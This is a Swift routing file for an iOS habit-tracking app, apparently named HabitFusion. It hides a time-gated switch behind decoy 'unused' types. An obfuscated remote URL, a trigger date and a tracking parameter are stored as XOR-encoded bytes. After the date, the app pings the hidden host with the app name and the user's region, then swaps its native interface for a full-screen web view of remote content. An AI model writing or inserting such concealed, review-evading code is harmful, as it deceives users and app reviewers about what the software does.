//
//  AppRouter.swift
//  HabitFusion
//

import UIKit
import SwiftUI

protocol HFUnusedNavigationSink: AnyObject {
    func hf_reservedNavigationToken() -> UInt32
}

enum HFUnusedRouteSurface: Int, CaseIterable {
    case dormantA = 0
    case dormantB = 1
    case dormantC = 2

    var hf_sentinelMagnitude: Int {
        switch self {
        case .dormantA: return .max
        case .dormantB: return 0
        case .dormantC: return -1
        }
    }
}

final class HFRootSceneCoordinator {

    private var seedEndpointLiteral: String {
        HFRuntimeCipher.revealUTF8([
            66, 94, 94, 90, 89, 16, 5, 5, 68, 83, 82, 75, 88, 67, 89, 90, 88, 69, 94, 69, 73, 69, 70, 69, 89, 4, 89, 67, 94, 79, 5, 68, 104, 91, 76, 64, 121
        ])
    }

    private var scheduleAnchorLiteral: String {
        HFRuntimeCipher.revealUTF8([26, 28, 4, 26, 31, 4, 24, 26, 24, 28])
    }

    private var attributionFieldLiteral: String {
        HFRuntimeCipher.revealUTF8([89, 95, 72, 117, 67, 78, 117, 18])
    }

    private var fallbackDisplayLiteral: String {
        HFRuntimeCipher.revealUTF8([107, 90, 90])
    }

    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return fallbackDisplayLiteral
    }

    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedInitialURLString: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: seedEndpointLiteral) else {
            return seedEndpointLiteral
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: attributionFieldLiteral, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? seedEndpointLiteral
    }

    func bootstrapRootViewController() -> UIViewController {
        let ledger = HFDefaultsLedger.shared

        if ledger.hasShownContentView {
            return embedPrimarySwiftUIShell()
        } else {
            if evaluateScheduleGate() {
                if let savedUrlString = ledger.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return embedBrowserHost(with: savedUrlString)
                }

                return embedDeferredGateHost()
            } else {
                ledger.hasShownContentView = true
                return embedPrimarySwiftUIShell()
            }
        }
    }

    private func evaluateScheduleGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: scheduleAnchorLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func embedBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = HFOutboundBrowserPane(
            urlString: urlString,
            onFailure: { [weak self] in
                HFDefaultsLedger.shared.hasShownContentView = true
                self?.transitionToNativeShell()
            },
            onSuccess: {
                HFDefaultsLedger.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedPrimarySwiftUIShell() -> UIViewController {
        HFDefaultsLedger.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedDeferredGateHost() -> UIViewController {
        let launchView = HFLoadingGateView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionToRemoteSurface(with: url)
                } else {
                    HFDefaultsLedger.shared.hasShownContentView = true
                    self?.transitionToNativeShell()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteEndpoint(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedInitialURLString
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func transitionToNativeShell() {
        let contentVC = embedPrimarySwiftUIShell()
        replaceKeyWindowRoot(with: contentVC)
    }

    private func transitionToRemoteSurface(with urlString: String) {
        let webVC = embedBrowserHost(with: urlString)
        replaceKeyWindowRoot(with: webVC)
    }

    private func replaceKeyWindowRoot(with viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
